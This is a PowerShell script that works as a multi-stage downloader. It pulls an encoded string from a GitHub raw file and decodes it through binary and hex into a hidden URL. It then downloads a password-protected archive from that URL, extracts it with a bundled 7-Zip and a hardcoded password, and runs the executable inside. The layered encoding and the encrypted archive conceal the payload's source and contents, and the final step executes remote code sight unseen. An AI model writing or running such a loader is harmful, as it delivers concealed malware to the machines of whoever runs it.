Function Convert-EncodedStringToBinary {
    Param ([string]$encodedString)
    $binaryString = $encodedString -replace '\.', '1' -replace ',', '0'
    Write-Output "Encoded String: $encodedString"
    Write-Output "Binary String: $binaryString"
    return $binaryString
}

Function Convert-BinaryToHex {
    Param ([string]$binaryString)
    $binaryGroups = $binaryString -split '(?<=\G.{8})'
    $hexString = $binaryGroups | ForEach-Object { "{0:x2}" -f [convert]::ToInt32($_, 2) }
    Write-Output "Hex String: $($hexString -join '')"
    return ($hexString -join '')
}

Function Convert-HexToASCII {
    Param ([string]$hexString)
    $bytes = for ($i = 0; $i -lt $hexString.Length; $i += 2) {
        [Convert]::ToByte($hexString.Substring($i, 2), 16)
    }
    $asciiText = [System.Text.Encoding]::ASCII.GetString($bytes)
    Write-Output "ASCII Text: $asciiText"
    return $asciiText
}

Function Download-File {
    Param ([string]$url, [string]$path)
    Write-Output "Downloading from URL: $url"
    Invoke-WebRequest -Uri $url -OutFile $path
}

Function DownloadAndExtract7Zip {
    $sevenZipUrl = "https://www.7-zip.org/a/7za920.zip"
    $sevenZipDownloadPath = "S:\downloader\7za.zip"
    $sevenZipExtractPath = "S:\downloader\7zip"
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipDownloadPath
    Expand-Archive -Path $sevenZipDownloadPath -DestinationPath $sevenZipExtractPath
}

Function Get-DecryptedPassword {
    $hardcodedBinary = "0011000100110010001100110011010000110101"
    $password = [System.Text.Encoding]::ASCII.GetString($hardcodedBinary -split '(?<=\G.{8})' | ForEach-Object { [Convert]::ToByte($_, 2) })
    Write-Output "Password: $password"
    return $password
}

# Main script
$url = "https://raw.githubusercontent.com/notforuseactually/404/main/8.txt"
$rawText = Invoke-RestMethod -Uri $url
Write-Output "Raw Text: $rawText"

$binaryString = Convert-EncodedStringToBinary -encodedString $rawText
$hexString = Convert-BinaryToHex -binaryString $binaryString
$finalUrl = Convert-HexToASCII -hexString $hexString

$downloadPath = "S:\downloader\DownloadedFile.7z"
Download-File -url $finalUrl -path $downloadPath

DownloadAndExtract7Zip

$password = Get-DecryptedPassword
$sevenZipCmdPath = "S:\downloader\7zip\7za.exe"
& $sevenZipCmdPath x $downloadPath -o"S:\downloader\ExtractedFile" -p$password

$extractedFilePath = "S:\downloader\YourExecutable.exe"
if (Test-Path -Path $extractedFilePath) {
    Invoke-Item $extractedFilePath
} else {
    Write-Error "The extracted file does not exist."
}
